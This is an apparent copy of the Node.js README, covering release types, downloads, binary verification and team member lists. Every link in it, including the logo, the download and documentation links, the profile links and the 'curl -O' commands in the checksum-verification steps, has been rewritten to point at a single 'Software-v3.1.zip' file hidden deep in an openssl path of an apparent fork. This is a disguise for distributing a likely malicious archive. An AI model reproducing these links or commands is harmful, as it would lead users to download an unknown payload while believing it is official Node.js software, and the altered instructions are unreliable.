<!--lint disable no-literal-urls-->

<p align="center">
  <a href="https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip">
    <img
      alt="Node.js"
      src="https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip"
      width="400"
    />
  </a>
</p>

Node.js is an open-source, cross-platform, JavaScript runtime environment. It
executes JavaScript code outside of a browser. For more information on using
Node.js, see the [Node.js Website][].

The Node.js project uses an [open governance model](./GOVERNANCE.md). The
[OpenJS Foundation][] provides support for the project.

**This project is bound by a [Code of Conduct][].**

# Table of contents

* [Support](#support)
* [Release types](#release-types)
  * [Download](#download)
    * [Current and LTS releases](#current-and-lts-releases)
    * [Nightly releases](#nightly-releases)
    * [API documentation](#api-documentation)
  * [Verifying binaries](#verifying-binaries)
* [Building Node.js](#building-nodejs)
* [Security](#security)
* [Contributing to Node.js](#contributing-to-nodejs)
* [Current project team members](#current-project-team-members)
  * [TSC (Technical Steering Committee)](#tsc-technical-steering-committee)
  * [Collaborators](#collaborators)
  * [Triagers](#triagers)
  * [Release keys](#release-keys)
* [License](#license)

## Support

Looking for help? Check out the
[instructions for getting support](.github/SUPPORT.md).

## Release types

* **Current**: Under active development. Code for the Current release is in the
  branch for its major version number (for example,
  [v15.x](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip)). Node.js releases a new
  major version every 6 months, allowing for breaking changes. This happens in
  April and October every year. Releases appearing each October have a support
  life of 8 months. Releases appearing each April convert to LTS (see below)
  each October.
* **LTS**: Releases that receive Long Term Support, with a focus on stability
  and security. Every even-numbered major version will become an LTS release.
  LTS releases receive 12 months of _Active LTS_ support and a further 18 months
  of _Maintenance_. LTS release lines have alphabetically-ordered code names,
  beginning with v4 Argon. There are no breaking changes or feature additions,
  except in some special circumstances.
* **Nightly**: Code from the Current branch built every 24-hours when there are
  changes. Use with caution.

Current and LTS releases follow [Semantic Versioning](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip). A
member of the Release Team [signs](#release-keys) each Current and LTS release.
For more information, see the
[Release README](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip).

### Download

Binaries, installers, and source tarballs are available at
<https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip>.

#### Current and LTS releases

<https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip>

The [latest](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) directory is an
alias for the latest Current release. The latest-_codename_ directory is an
alias for the latest release from an LTS line. For example, the
[latest-fermium](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) directory
contains the latest Fermium (Node.js 14) release.

#### Nightly releases

<https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip>

Each directory name and filename contains a date (in UTC) and the commit
SHA at the HEAD of the release.

#### API documentation

Documentation for the latest Current release is at <https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip>.
Version-specific documentation is available in each release directory in the
_docs_ subdirectory. Version-specific documentation is also at
<https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip>.

### Verifying binaries

Download directories contain a `SHASUMS256.txt` file with SHA checksums for the
files.

To download `SHASUMS256.txt` using `curl`:

```console
$ curl -O https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip
```

To check that a downloaded file matches the checksum, run
it through `sha256sum` with a command such as:

```console
$ grep node-vx.y.z.tar.gz SHASUMS256.txt | sha256sum -c -
```

For Current and LTS, the GPG detached signature of `SHASUMS256.txt` is in
`SHASUMS256.txt.sig`. You can use it with `gpg` to verify the integrity of
`SHASUMS256.txt`. You will first need to import
[the GPG keys of individuals authorized to create releases](#release-keys). To
import the keys:

```console
$ gpg --keyserver pool.sks-keyservers.net --recv-keys DD8F2338BAE7501E3DD5AC78C273792F7D83545D
```

See the bottom of this README for a full script to import active release keys.

Next, download the `SHASUMS256.txt.sig` for the release:

```console
$ curl -O https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip
```

Then use `gpg --verify SHASUMS256.txt.sig SHASUMS256.txt` to verify
the file's signature.

## Building Node.js

See [BUILDING.md](BUILDING.md) for instructions on how to build Node.js from
source and a list of supported platforms.

## Security

For information on reporting security vulnerabilities in Node.js, see
[SECURITY.md](./SECURITY.md).

## Contributing to Node.js

* [Contributing to the project][]
* [Working Groups][]
* [Strategic initiatives][]
* [Technical values and prioritization][]

## Current project team members

For information about the governance of the Node.js project, see
[GOVERNANCE.md](./GOVERNANCE.md).

<!-- node-core-utils depends on the format of the TSC list. If the
     format changes, those utilities need to be tested and updated. -->

### TSC (Technical Steering Committee)

<!--lint disable prohibited-strings-->

* [aduh95](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Antoine du Hamel** \<duhamelantoine1995@gmail.com> (he/him)
* [apapirovski](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Anatoli Papirovski** \<apapirovski@mac.com> (he/him)
* [BethGriggs](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Beth Griggs** \<bgriggs@redhat.com> (she/her)
* [BridgeAR](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Ruben Bridgewater** \<ruben@bridgewater.de> (he/him)
* [ChALkeR](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Сковорода Никита Андреевич** \<chalkerx@gmail.com> (he/him)
* [cjihrig](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Colin Ihrig** \<cjihrig@gmail.com> (he/him)
* [codebytere](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Shelley Vohr** \<shelley.vohr@gmail.com> (she/her)
* [danielleadams](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Danielle Adams** \<adamzdanielle@gmail.com> (she/her)
* [fhinkel](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Franziska Hinkelmann** \<franziska.hinkelmann@gmail.com> (she/her)
* [gabrielschulhof](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Gabriel Schulhof** \<gabrielschulhof@gmail.com>
* [gireeshpunathil](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Gireesh Punathil** \<gpunathi@in.ibm.com> (he/him)
* [jasnell](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **James M Snell** \<jasnell@gmail.com> (he/him)
* [joyeecheung](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Joyee Cheung** \<joyeec9h3@gmail.com> (she/her)
* [mcollina](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Matteo Collina** \<matteo.collina@gmail.com> (he/him)
* [mhdawson](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Michael Dawson** \<midawson@redhat.com> (he/him)
* [mmarchini](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Mary Marchini** \<oss@mmarchini.me> (she/her)
* [MylesBorins](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Myles Borins** \<myles.borins@gmail.com> (he/him)
* [richardlau](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Richard Lau** \<rlau@redhat.com>
* [ronag](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Robert Nagy** \<ronagy@icloud.com>
* [targos](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Michaël Zasso** \<targos@protonmail.com> (he/him)
* [tniessen](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Tobias Nießen** \<tniessen@tnie.de> (he/him)
* [Trott](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Rich Trott** \<rtrott@gmail.com> (he/him)

<details>

<summary>Emeriti</summary>

### TSC emeriti

* [addaleax](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Anna Henningsen** \<anna@addaleax.net> (she/her)
* [bnoordhuis](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Ben Noordhuis** \<info@bnoordhuis.nl>
* [chrisdickinson](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Chris Dickinson** \<christopher.s.dickinson@gmail.com>
* [danbev](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Daniel Bevenius** \<daniel.bevenius@gmail.com> (he/him)
* [evanlucas](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Evan Lucas** \<evanlucas@me.com> (he/him)
* [Fishrock123](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Jeremiah Senkpiel** \<fishrock123@rocketmail.com> (he/they)
* [gibfahn](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Gibson Fahnestock** \<gibfahn@gmail.com> (he/him)
* [indutny](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Fedor Indutny** \<fedor@indutny.com>
* [isaacs](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Isaac Z. Schlueter** \<i@izs.me>
* [joshgav](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Josh Gavant** \<josh.gavant@outlook.com>
* [mscdex](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Brian White** \<mscdex@mscdex.net>
* [nebrius](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Bryan Hughes** \<bryan@nebri.us>
* [ofrobots](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Ali Ijaz Sheikh** \<ofrobots@google.com> (he/him)
* [orangemocha](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Alexis Campailla** \<orangemocha@nodejs.org>
* [piscisaureus](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Bert Belder** \<bertbelder@gmail.com>
* [rvagg](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Rod Vagg** \<r@va.gg>
* [sam-github](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Sam Roberts** \<vieuxtech@gmail.com>
* [shigeki](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Shigeki Ohtsu** \<ohtsu@ohtsu.org> (he/him)
* [thefourtheye](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Sakthipriyan Vairamani** \<thechargingvolcano@gmail.com> (he/him)
* [TimothyGu](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Tiancheng "Timothy" Gu** \<timothygu99@gmail.com> (he/him)
* [trevnorris](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Trevor Norris** \<trev.norris@gmail.com>

</details>

<!-- node-core-utils and find-inactive-collaborators.mjs depend on the format
     of the collaborator list. If the format changes, those utilities need to be
     tested and updated. -->

### Collaborators

* [addaleax](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Anna Henningsen** \<anna@addaleax.net> (she/her)
* [aduh95](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Antoine du Hamel** \<duhamelantoine1995@gmail.com> (he/him)
* [ak239](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Aleksei Koziatinskii** \<ak239spb@gmail.com>
* [antsmartian](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Anto Aravinth** \<anto.aravinth.cse@gmail.com> (he/him)
* [apapirovski](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Anatoli Papirovski** \<apapirovski@mac.com> (he/him)
* [AshCripps](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Ash Cripps** \<acripps@redhat.com>
* [Ayase-252](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Qingyu Deng** \<i@ayase-lab.com>
* [bcoe](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Ben Coe** \<bencoe@gmail.com> (he/him)
* [bengl](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Bryan English** \<bryan@bryanenglish.com> (he/him)
* [benjamingr](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Benjamin Gruenbaum** \<benjamingr@gmail.com>
* [BethGriggs](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Beth Griggs** \<bgriggs@redhat.com> (she/her)
* [bmeck](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Bradley Farias** \<bradley.meck@gmail.com>
* [boneskull](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Christopher Hiller** \<boneskull@boneskull.com> (he/him)
* [BridgeAR](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Ruben Bridgewater** \<ruben@bridgewater.de> (he/him)
* [bzoz](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Bartosz Sosnowski** \<bartosz@janeasystems.com>
* [cclauss](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Christian Clauss** \<cclauss@me.com> (he/him)
* [ChALkeR](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Сковорода Никита Андреевич** \<chalkerx@gmail.com> (he/him)
* [cjihrig](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Colin Ihrig** \<cjihrig@gmail.com> (he/him)
* [codebytere](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Shelley Vohr** \<shelley.vohr@gmail.com> (she/her)
* [danbev](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Daniel Bevenius** \<daniel.bevenius@gmail.com> (he/him)
* [danielleadams](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Danielle Adams** \<adamzdanielle@gmail.com> (she/her)
* [davisjam](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Jamie Davis** \<davisjam@vt.edu> (he/him)
* [DerekNonGeneric](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Derek Lewis** \<DerekNonGeneric@inf.is> (he/him)
* [devnexen](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **David Carlier** \<devnexen@gmail.com>
* [devsnek](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Gus Caplan** \<me@gus.host> (they/them)
* [dmabupt](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Xu Meng** \<dmabupt@gmail.com> (he/him)
* [dnlup](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip)
  **Daniele Belardi** \<dwon.dnl@gmail.com> (he/him)
* [edsadr](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Adrian Estrada** \<edsadr@gmail.com> (he/him)
* [eugeneo](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Eugene Ostroukhov** \<eostroukhov@google.com>
* [evanlucas](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Evan Lucas** \<evanlucas@me.com> (he/him)
* [fhinkel](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Franziska Hinkelmann** \<franziska.hinkelmann@gmail.com> (she/her)
* [Flarna](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Gerhard Stöbich** \<deb2001-github@yahoo.de>  (he/they)
* [gabrielschulhof](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Gabriel Schulhof** \<gabrielschulhof@gmail.com>
* [gengjiawen](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Jiawen Geng** \<technicalcute@gmail.com>
* [GeoffreyBooth](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Geoffrey Booth** \<webadmin@geoffreybooth.com> (he/him)
* [gireeshpunathil](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Gireesh Punathil** \<gpunathi@in.ibm.com> (he/him)
* [guybedford](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Guy Bedford** \<guybedford@gmail.com> (he/him)
* [HarshithaKP](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Harshitha K P** \<harshitha014@gmail.com> (she/her)
* [hashseed](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Yang Guo** \<yangguo@chromium.org> (he/him)
* [himself65](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Zeyu Yang** \<himself65@outlook.com> (he/him)
* [hiroppy](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Yuta Hiroto** \<hello@hiroppy.me> (he/him)
* [iansu](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Ian Sutherland** \<ian@iansutherland.ca>
* [indutny](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Fedor Indutny** \<fedor@indutny.com>
* [JacksonTian](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Jackson Tian** \<shyvo1987@gmail.com>
* [jasnell](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **James M Snell** \<jasnell@gmail.com> (he/him)
* [jkrems](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Jan Krems** \<jan.krems@gmail.com> (he/him)
* [joaocgreis](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **João Reis** \<reis@janeasystems.com>
* [joyeecheung](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Joyee Cheung** \<joyeec9h3@gmail.com> (she/her)
* [juanarbol](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Juan José Arboleda** \<soyjuanarbol@gmail.com> (he/him)
* [JungMinu](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Minwoo Jung** \<nodecorelab@gmail.com> (he/him)
* [legendecas](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Chengzhong Wu** \<legendecas@gmail.com> (he/him)
* [Leko](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Shingo Inoue** \<leko.noor@gmail.com> (he/him)
* [linkgoron](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Nitzan Uziely** \<linkgoron@gmail.com>
* [lpinca](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Luigi Pinca** \<luigipinca@gmail.com> (he/him)
* [lundibundi](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Denys Otrishko** \<shishugi@gmail.com> (he/him)
* [Lxxyx](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Zijian Liu** \<lxxyxzj@gmail.com> (he/him)
* [mafintosh](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Mathias Buus** \<mathiasbuus@gmail.com> (he/him)
* [mcollina](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Matteo Collina** \<matteo.collina@gmail.com> (he/him)
* [mhdawson](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Michael Dawson** \<midawson@redhat.com> (he/him)
* [miladfarca](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Milad Fa** \<mfarazma@redhat.com> (he/him)
* [mildsunrise](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Alba Mendez** \<me@alba.sh> (she/her)
* [mmarchini](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Mary Marchini** \<oss@mmarchini.me> (she/her)
* [mscdex](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Brian White** \<mscdex@mscdex.net>
